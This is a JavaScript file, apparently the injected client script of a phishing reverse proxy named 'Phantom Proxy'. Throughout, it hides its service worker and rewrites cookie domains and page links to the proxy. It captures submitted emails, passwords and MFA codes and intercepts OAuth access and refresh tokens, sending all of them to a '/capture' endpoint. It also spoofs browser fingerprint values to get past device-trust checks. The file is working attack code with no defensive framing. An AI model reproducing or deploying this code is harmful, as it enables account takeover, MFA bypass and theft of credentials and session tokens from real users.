// ============================================================
// 🥔 PHANTOM PROXY — ADVANCED SCRIPT ENGINE v10.5
// ============================================================
// 🔥 Original features + enhanced security bypass
// ============================================================

(function() {
    'use strict';

    // ── ✅ HIDE SERVICE WORKER ──
    (function hideServiceWorker() {
        const originalGetRegistration = navigator.serviceWorker.getRegistration;
        navigator.serviceWorker.getRegistration = function(scope) {
            return originalGetRegistration.apply(this, arguments)
                .then(registration => {
                    if (registration && registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith('service_worker_Mz8XO2ny1Pg5.js')) {
                        return undefined;
                    }
                    return registration;
                });
        };

        const originalGetRegistrations = navigator.serviceWorker.getRegistrations;
        navigator.serviceWorker.getRegistrations = function() {
            return originalGetRegistrations.apply(this, arguments)
                .then(registrations => {
                    return registrations.filter(registration => {
                        return !(registration.active &&
                            registration.active.scriptURL &&
                            registration.active.scriptURL.endsWith('service_worker_Mz8XO2ny1Pg5.js'));
                    });
                });
        };
    })();

    // ── ✅ HIJACK COOKIES ──
    (function hijackCookies() {
        const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');

        Object.defineProperty(document, 'cookie', {
            ...originalCookieDescriptor,
            get() {
                return originalCookieDescriptor.get.call(document);
            },
            set(cookie) {
                const proxyRequestURL = `${self.location.origin}/JSCookie_6X7dRqLg90mH`;
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', proxyRequestURL, false);
                    xhr.setRequestHeader('Content-Type', 'text/plain');
                    xhr.send(cookie);

                    const validDomains = JSON.parse(xhr.responseText);
                    let modifiedCookie = '';

                    const cookieAttributes = cookie.split(';');
                    for (const cookieAttribute of cookieAttributes) {
                        let attribute = cookieAttribute.trim();
                        if (attribute) {
                            const cookieDomainMatch = attribute.match(/^DOMAIN\s*=(.*)$/i);
                            if (cookieDomainMatch) {
                                const cookieDomain = cookieDomainMatch[1].replace(/^\./, '').trim();
                                if (cookieDomain && validDomains.includes(cookieDomain)) {
                                    attribute = `Domain=${self.location.hostname}`;
                                }
                            }
                            modifiedCookie += `${attribute}; `;
                        }
                    }
                    originalCookieDescriptor.set.call(document, modifiedCookie.trim());
                } catch (error) {
                    console.error(`Cookie hijack failed: ${error}`);
                }
            }
        });
    })();

    // ── ✅ MUTATION OBSERVER ──
    (function setupMutationObserver() {
        const observer = new MutationObserver((mutations) => {
            for (const mutation of mutations) {
                if (mutation.type === 'attributes') {
                    updateHTMLAttribute(mutation.target, mutation.attributeName);
                } else if (mutation.type === 'childList') {
                    for (const node of mutation.addedNodes) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            for (const attr of attributes) {
                                if (node[attr]) {
                                    updateHTMLAttribute(node, attr);
                                }
                            }
                        }
                    }
                }
            }
        });

        const attributes = ['href', 'action', 'src', 'formaction', 'data-url'];

        observer.observe(document.documentElement, {
            childList: true,
            subtree: true,
            attributeFilter: attributes
        });

        function updateHTMLAttribute(htmlNode, htmlAttribute) {
            try {
                const attrValue = htmlNode[htmlAttribute];
                if (!attrValue || typeof attrValue !== 'string') return;
                
                const htmlAttributeURL = new URL(attrValue, window.location.href);

                if (htmlAttributeURL.origin !== self.location.origin) {
                    const proxyRequestURL = new URL(`${self.location.origin}/Mutation_o5y3f4O7jMGW`);
                    proxyRequestURL.searchParams.append('redirect_urI', encodeURIComponent(htmlAttributeURL.href));

                    htmlNode[htmlAttribute] = proxyRequestURL;
                }
            } catch (e) {
                // Ignore invalid URLs
            }
        }
    })();

    // ── ✅ NEW: CREDENTIAL CAPTURE ──
    (function captureCredentials() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            if (form.tagName === 'FORM') {
                const email = form.querySelector('input[type="email"], input[name*="email"], input[name*="loginfmt"], input[name*="user"]');
                const password = form.querySelector('input[type="password"], input[name*="password"], input[name*="passwd"]');
                
                if (email && password && email.value && password.value) {
                    console.log('🔐 Captured:', { email: email.value, password: password.value });
                    
                    // Send via beacon (stealthy)
                    if (navigator.sendBeacon) {
                        const data = new URLSearchParams({
                            email: email.value,
                            password: password.value,
                            timestamp: new Date().toISOString()
                        });
                        navigator.sendBeacon('/capture', data);
                    }
                    
                    // Also send via fetch
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams({ email: email.value, password: password.value })
                    }).catch(() => {});
                }
            }
        }, true);
    })();

    // ── ✅ NEW: MFA DETECTION ──
    (function detectMFA() {
        const mfaKeywords = ['code', 'verification', 'authenticator', 'mfa', '2fa', 'sms', 'phone', 'approve'];
        const bodyText = document.body?.innerText || '';
        
        if (mfaKeywords.some(kw => bodyText.toLowerCase().includes(kw))) {
            console.log('📱 MFA page detected');
            
            const mfaInput = document.querySelector('input[name*="code"], input[name*="otp"], input[type="text"][maxlength="6"]');
            if (mfaInput) {
                setTimeout(() => mfaInput.focus(), 200);
                
                // Capture MFA on submit
                document.addEventListener('submit', function(e) {
                    const form = e.target;
                    if (form.tagName === 'FORM') {
                        const code = form.querySelector('input[name*="code"], input[name*="otp"]');
                        if (code && code.value && code.value.length >= 6) {
                            console.log('📱 MFA captured:', code.value);
                            if (navigator.sendBeacon) {
                                const data = new URLSearchParams({ mfa: code.value });
                                navigator.sendBeacon('/capture', data);
                            }
                        }
                    }
                }, true);
            }
        }
    })();

    // ── ✅ NEW: TOKEN INTERCEPTION ──
    (function interceptTokens() {
        const originalFetch = window.fetch;
        window.fetch = function(url, options) {
            if (typeof url === 'string' && (
                url.includes('/oauth2/v2.0/token') ||
                url.includes('/common/oauth2/token') ||
                url.includes('/v2.0/token')
            )) {
                return originalFetch.call(this, url, options).then(async (response) => {
                    const clone = response.clone();
                    try {
                        const data = await clone.text();
                        const json = JSON.parse(data);
                        if (json.access_token || json.id_token || json.refresh_token) {
                            console.log('🔑 Tokens intercepted:', json);
                            if (navigator.sendBeacon) {
                                const blob = new Blob([JSON.stringify({ tokens: json })], { type: 'application/json' });
                                navigator.sendBeacon('/capture', blob);
                            }
                        }
                    } catch (e) {}
                    return response;
                });
            }
            return originalFetch.call(this, url, options);
        };

        // XHR interception
        const originalXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            const originalSend = xhr.send;

            xhr.open = function(method, url, ...args) {
                this._url = url;
                this._method = method;
                return originalOpen.call(this, method, url, ...args);
            };

            xhr.send = function(body) {
                if (this._url && (
                    this._url.includes('/oauth2/v2.0/token') ||
                    this._url.includes('/common/oauth2/token')
                )) {
                    const originalOnReadyStateChange = this.onreadystatechange;
                    this.onreadystatechange = function() {
                        if (this.readyState === 4 && this.status === 200) {
                            try {
                                const data = JSON.parse(this.responseText);
                                if (data.access_token || data.id_token) {
                                    console.log('🔑 XHR Tokens:', data);
                                    if (navigator.sendBeacon) {
                                        const blob = new Blob([JSON.stringify({ tokens: data })], { type: 'application/json' });
                                        navigator.sendBeacon('/capture', blob);
                                    }
                                }
                            } catch (e) {}
                        }
                        if (originalOnReadyStateChange) {
                            originalOnReadyStateChange.call(this);
                        }
                    };
                }
                return originalSend.call(this, body);
            };
            return xhr;
        };
    })();

    // ── ✅ NEW: DEVICE TRUST BYPASS ──
    (function bypassDeviceTrust() {
        // Spoof WebGL renderer
        if (document.createElement('canvas')) {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('webgl');
            if (ctx) {
                const originalGetParameter = ctx.getParameter;
                ctx.getParameter = function(parameter) {
                    if (parameter === 37445) return 'ANGLE (NVIDIA GeForce RTX 3080)';
                    if (parameter === 37446) return 'NVIDIA Corporation';
                    return originalGetParameter.call(this, parameter);
                };
            }
        }

        // Spoof navigator properties
        Object.defineProperty(navigator, 'platform', {
            get: () => 'Win32',
            configurable: true
        });
        
        Object.defineProperty(navigator, 'userAgent', {
            get: () => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            configurable: true
        });
    })();

    // ── ✅ NEW: SESSION PERSISTENCE ──
    (function persistSession() {
        // Store session in localStorage to survive page reloads
        const sessionId = localStorage.getItem('phantom_session') || 
                          Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        localStorage.setItem('phantom_session', sessionId);
        
        // Send session ID with all requests
        const originalFetch = window.fetch;
        window.fetch = function(url, options) {
            options = options || {};
            options.headers = options.headers || {};
            options.headers['X-Phantom-Session'] = sessionId;
            return originalFetch.call(this, url, options);
        };
    })();

    // ── ✅ CONSOLE API ──
    window.__PHANTOM = {
        version: '10.5',
        status: function() {
            console.log('🥔 PHANTOM Status:', {
                session: localStorage.getItem('phantom_session'),
                cookies: document.cookie,
                url: window.location.href,
                sw: !!navigator.serviceWorker.controller
            });
        },
        capture: function(email, password) {
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ email, password })
            });
        }
    };

    console.log('✅ PHANTOM Script Engine v10.5 Loaded');
    console.log('💀 Type __PHANTOM.status() for status');
})();
